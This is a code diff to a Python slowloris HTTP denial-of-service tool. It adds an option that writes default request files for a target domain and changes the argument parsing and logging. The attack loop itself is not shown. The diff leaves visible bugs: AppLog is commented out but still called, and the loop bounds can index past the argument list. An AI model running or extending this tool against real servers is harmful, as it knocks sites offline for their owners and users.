@@ -29,17 +29,18 @@ def PrintHelp():
     print("An attemt at slow loris HTTP attack")                       
     print("")
     print("Options:")
-    print(" -h, --help                 display this help")
-    print(" -a, --address      (1)     domain")
-    print(" -d, --directory            directory with HTTP request files")
-    print(" -t, --threads      (2)     number of threads.")
-    print(" -s, --sleep                HTTP request chars delay - in seconds")
-    print(" -e, --extension    (3)     HTTP request file extension")
+    print(" -h, --help                   display this help")
+    print(" -a, --address        (1)     domain")
+    print(" -d, --directory              directory with HTTP request files")
+    print(" -t, --threads        (2)     number of threads.")
+    print(" -s, --sleep                  HTTP request chars delay - in seconds")
+    print(" -e, --extension      (3)     HTTP request file extension")
+    print(" -r, --create-request (4)     Creates default request files in directory")
     print("")
     print("(1) Required field")
     print("(2) Min: 1, Max: 999, Default: 1")
     print("(3) Default is .txt")
-    print("")
+    print("(4) Creates -t number of default request files in -d directory with -e extension")
 
 #
 # Get Arg Value
@@ -48,7 +49,7 @@ def GetArgValue(token1, token2):
     count = len(sys.argv)
     count -= 1
     i = 0
-    while i < count:
+    while i <= count:
         if sys.argv[i] == str(token1) or sys.argv[i] == str(token2):
             return sys.argv[i+1]
         i += 1
@@ -58,16 +59,31 @@ def GetHasArgValue(token1, token2):
     count = len(sys.argv)
     count -= 1
     i = 0
-    while i < count:
+    while i <= count:
         if sys.argv[i] == str(token1) or sys.argv[i] == str(token2):
             return True
         i += 1
     return False
 
+def CreateDefaultRequestFiles(directory, extension, domain, count):
+    if directory[len(directory)-1] != "/":
+        directory = directory + "/"
+    i = 0
+    while i < count:
+        filename = directory + str(i+1) + extension
+        f = open(filename, "w")
+        f.write("GET / HTTP/1.1")
+        f.write("\n")
+        f.write("HOST: " + domain)
+        f.write("\n")
+        f.write("\n")
+        f.close()
+        i += 1
+
 #
 # Global ApplicationLog object
 #
-AppLog = ItsLog.ItsApplicationLog()
+#AppLog = ItsLog.ItsApplicationLog()
 Flag = True
 
 #
@@ -159,6 +175,7 @@ def main():
     directory = ""          #: directory
     extension = ".txt"      #: direcory extensions to look for
     directory_files = []
+    def_req = False
     try:
         if GetHasArgValue("-h", "--help"):
             PrintHelp()
@@ -193,7 +210,13 @@ def main():
         else:
             extension = ".txt"
 
+        def_req = GetHasArgValue("-r","--create-request")        
         directory = str(GetArgValue("-d", "--directory"))   #: directory with http request files 
+        if def_req and len(directory) > 0 and ttc >= 1:
+            CreateDefaultRequestFiles(directory,extension,domain,ttc)
+            print("> Default Request Files Written <")
+            exit(0)
+
         if len(directory) > 0:
             if directory[len(directory)-1] != "/":
                 directory = directory + "/"
@@ -203,6 +226,7 @@ def main():
                 print("> Too many files. Must be more than 0 and less than or equal 999. See threads argument in help. <")
                 PrintHelp()
                 exit(1)
+
     except ValueError as ex:
         AppLog.LogError("One or more Invalid parameter!")
         AppLog.PrintToConsole()
